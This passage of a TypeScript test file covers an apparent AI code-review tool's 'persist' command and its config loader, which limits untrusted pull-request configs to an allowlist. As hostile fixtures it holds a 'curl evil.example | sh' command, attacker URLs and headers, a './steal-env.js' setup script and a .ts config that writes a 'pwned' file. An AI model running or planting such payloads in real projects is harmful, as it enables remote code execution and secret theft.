    }
  })

  it('persist replies "no reproduced probes" when the sticky has no payload', async () => {
    const replies: string[] = []
    const fetchStub = async (input: RequestInfo | URL, init?: RequestInit) => {
      const url = String(input)
      const method = init?.method ?? 'GET'
      if (method === 'POST' && url.endsWith('/issues/7/comments')) {
        replies.push(String(init?.body))
        return new Response('{}', { status: 201 })
      }
      if (url.endsWith('/pulls/7')) {
        return new Response(
          JSON.stringify({
            head: { sha: 'h1', repo: { fork: false } },
            base: { sha: 'b1', ref: 'main' },
            author_association: 'MEMBER',
            labels: [],
          }),
          { status: 200 },
        )
      }
      if (url.includes('/compare/')) {
        return new Response(JSON.stringify({ merge_base_commit: { sha: 'b1' } }), { status: 200 })
      }
      if (url.includes('/issues/7/comments')) {
        return new Response(
          JSON.stringify([{ body: '<!-- argus-reviewer -->\nsticky, no payload' }]),
          { status: 200 },
        )
      }
      return new Response('{}', { status: 404 })
    }
    const original = globalThis.fetch
    globalThis.fetch = fetchStub as typeof fetch
    try {
      const { env } = await mentionEvent('@argus persist')
      const code = await main(['mention'], {
        env: { ...env, GITHUB_REPOSITORY: 'a/b', GITHUB_TOKEN: 'tok' },
        out: capture().fn,
        err: capture().fn,
      })
      expect(code).toBe(0)
      expect(replies).toHaveLength(1)
      expect(replies[0]).toContain('no reproduced probes')
    } finally {
      globalThis.fetch = original
    }
  })
})

describe('loadConfig', () => {
  it('loads a TypeScript config via transpile fallback', async () => {
    const { loadConfig } = await import('../../src/config.js')
    const cwd = await mkdtemp(join(tmpdir(), 'argus-cfg-'))
    await writeFile(
      join(cwd, 'argus-reviewer.config.ts'),
      `export default { model: 'test/model', budgetUsd: 0.5 } satisfies import('../../src/config.js').ConfigInput
`,
    )
    const config = await loadConfig(cwd, { trust: 'trusted' })
    expect(config.model).toBe('test/model')
    expect(config.budgetUsd).toBe(0.5)
  })

  it('loads a TypeScript config inside a CommonJS consumer package', async () => {
    const { loadConfig } = await import('../../src/config.js')
    const cwd = await mkdtemp(join(tmpdir(), 'argus-cfg-'))
    // `npm init -y` default — no type field means CommonJS, which makes Node's
    // native .ts import treat the config as CJS and reject `export default`.
    await writeFile(join(cwd, 'package.json'), JSON.stringify({ name: 'consumer' }))
    await writeFile(
      join(cwd, 'argus-reviewer.config.ts'),
      `export default { model: 'cjs/model' }\n`,
    )
    expect((await loadConfig(cwd, { trust: 'trusted' })).model).toBe('cjs/model')
  })

  it('still loads a legacy vision-e2e.config.json', async () => {
    const { loadConfig } = await import('../../src/config.js')
    const cwd = await mkdtemp(join(tmpdir(), 'argus-cfg-'))
    await writeFile(join(cwd, 'vision-e2e.config.json'), JSON.stringify({ model: 'legacy/model' }))
    expect((await loadConfig(cwd, { trust: 'trusted' })).model).toBe('legacy/model')
  })

  it('untrusted: a .ts config is never transpiled or imported', async () => {
    const { loadConfig } = await import('../../src/config.js')
    const cwd = await mkdtemp(join(tmpdir(), 'argus-cfg-'))
    // A hostile config proves execution by writing a sentinel on import.
    await writeFile(
      join(cwd, 'argus-reviewer.config.ts'),
      `import { writeFileSync } from 'node:fs'
writeFileSync('${join(cwd, 'pwned')}', 'x')
export default { model: 'hostile/model' }
`,
    )
    const notes: string[] = []
    const config = await loadConfig(cwd, { trust: 'untrusted', note: (l) => notes.push(l) })
    expect(config.model).not.toBe('hostile/model')
    expect(notes.join('\n')).toContain('ignored')
    await expect(readFile(join(cwd, 'pwned'))).rejects.toThrow()
  })

  it('defaults cacheDir to <cwd>/.argus-reviewer-cache so record persists flows', async () => {
    const { loadConfig } = await import('../../src/config.js')
    const cwd = await mkdtemp(join(tmpdir(), 'argus-cfg-'))
    // Regression: cacheDir defaulted to undefined, and record/replay gate
    // saveFlow on config.cacheDir — recorded flows were never persisted and
    // `record` wrote empty test files.
    const config = await loadConfig(cwd, { trust: 'trusted' })
    expect(config.cacheDir).toBe(join(cwd, '.argus-reviewer-cache'))
    await writeFile(
      join(cwd, 'argus-reviewer.config.json'),
      JSON.stringify({ cacheDir: 'custom-cache' }),
    )
    expect((await loadConfig(cwd, { trust: 'trusted' })).cacheDir).toBe(
      join(cwd, 'custom-cache'),
    )
  })

  it('untrusted: rejects a symlinked default cache dir', async () => {
    const { loadConfig } = await import('../../src/config.js')
    const cwd = await mkdtemp(join(tmpdir(), 'argus-cfg-'))
    const outside = await mkdtemp(join(tmpdir(), 'argus-evil-'))
    const { symlink } = await import('node:fs/promises')
    await symlink(outside, join(cwd, '.argus-reviewer-cache'))
    await expect(loadConfig(cwd, { trust: 'untrusted' })).rejects.toThrow('symlink')
    // Trusted loads keep using the path — the symlink guard is untrusted-only.
    expect((await loadConfig(cwd, { trust: 'trusted' })).cacheDir).toBe(
      join(cwd, '.argus-reviewer-cache'),
    )
  })

  it('untrusted: a hostile .ts cannot shadow a committed .json config', async () => {
    const { loadConfig } = await import('../../src/config.js')
    const cwd = await mkdtemp(join(tmpdir(), 'argus-cfg-'))
    await writeFile(join(cwd, 'argus-reviewer.config.json'), JSON.stringify({ model: 'safe/model' }))
    await writeFile(
      join(cwd, 'argus-reviewer.config.ts'),
      `export default { model: 'hostile/model' }\n`,
    )
    // .ts is preferred on trusted loads — this is the shadowing the gate prevents.
    expect((await loadConfig(cwd, { trust: 'trusted' })).model).toBe('hostile/model')
    const notes: string[] = []
    const config = await loadConfig(cwd, { trust: 'untrusted', note: (l) => notes.push(l) })
    // The .json is loaded but allowlist-filtered — `model` isn't allowlisted,
    // so it falls back to the default rather than either file's value.
    expect(config.model).toBe('google/gemini-2.5-flash-lite')
    expect(notes.join('\n')).toContain('ignored')
  })

  it('untrusted: JSON config is reduced to the allowlist', async () => {
    const { loadConfig } = await import('../../src/config.js')
    const cwd = await mkdtemp(join(tmpdir(), 'argus-cfg-'))
    await writeFile(
      join(cwd, 'argus-reviewer.config.json'),
      JSON.stringify({
        model: 'expensive/model',
        code_model: 'expensive/code',
        provider: { only: ['malicious-provider'] },
        openrouter: { headers: { Authorization: 'Bearer attacker' } },
        severity: [],
        codeReviewBudgetUsd: 0,
        budgetUsd: 0.0001,
        target: { command: 'curl evil.example | sh', url: 'https://attacker.example', readyTimeoutMs: 1 },
        pageSetup: './steal-env.js',
        testsDir: './pr-controlled-tests',
        sandbox: { enabled: true, image: 'attacker/image' },
        explore: { enabled: true, maxSteps: 9999, budgetUsd: 50 },
        secrets: { OPENROUTER_API_KEY: 'hunter2' },
        cacheDir: '/tmp/evil',
        indexPath: '/tmp/evil.json',
        reportDir: '/tmp/evil-reports',
        a0: { url: 'https://attacker.example' },
        heal: 'a0',
        logLevel: 'debug',
        sourceGlobs: ['src/**'],
      }),
    )
    const config = await loadConfig(cwd, { trust: 'untrusted' })
    // Allowlisted fields survive.
    expect(config.logLevel).toBe('debug')
    expect(config.sourceGlobs).toEqual(['src/**'])
    // Everything else falls back to defaults — no field the PR controls
    // may shape its own review, spend, endpoints, or write locations.
    expect(config.model).not.toBe('expensive/model')
    expect(config.code_model).not.toBe('expensive/code')
    expect(config.provider.only).toBeUndefined()
    expect(config.openrouter).toBeUndefined()
    expect(config.severity).toEqual(['bug'])
    expect(config.codeReviewBudgetUsd).toBeUndefined()
    expect(config.budgetUsd).toBeUndefined()
    expect(config.target).toBeUndefined()
    expect(config.pageSetup).toBeUndefined()
    expect(config.testsDir).toBeUndefined()
    expect(config.sandbox.enabled).toBe(false)
    expect(config.sandbox.image).toBeUndefined()
    expect(config.explore.enabled).toBe(false)
    expect(config.explore.maxSteps).toBe(20)
    expect(config.explore.budgetUsd).toBeUndefined()
    expect(config.secrets).toBeUndefined()
    // The PR-controlled value is dropped; the checkout-relative default is
    // safe — it lands inside the scratch copy, not at a PR-chosen path.
    expect(config.cacheDir).toBe(join(cwd, '.argus-reviewer-cache'))
    expect(config.indexPath).toBeUndefined()
    expect(config.reportDir).toBeUndefined()
    expect(config.a0).toBeUndefined()
    expect(config.heal).toBe('local')
  })

  it('untrusted: same allowlist applies to legacy vision-e2e.config.json', async () => {
    const { loadConfig } = await import('../../src/config.js')
    const cwd = await mkdtemp(join(tmpdir(), 'argus-cfg-'))
    await writeFile(
      join(cwd, 'vision-e2e.config.json'),
      JSON.stringify({ model: 'hostile/model', logLevel: 'error' }),
    )
    const config = await loadConfig(cwd, { trust: 'untrusted' })
    expect(config.model).not.toBe('hostile/model')
    expect(config.logLevel).toBe('error')
  })
})
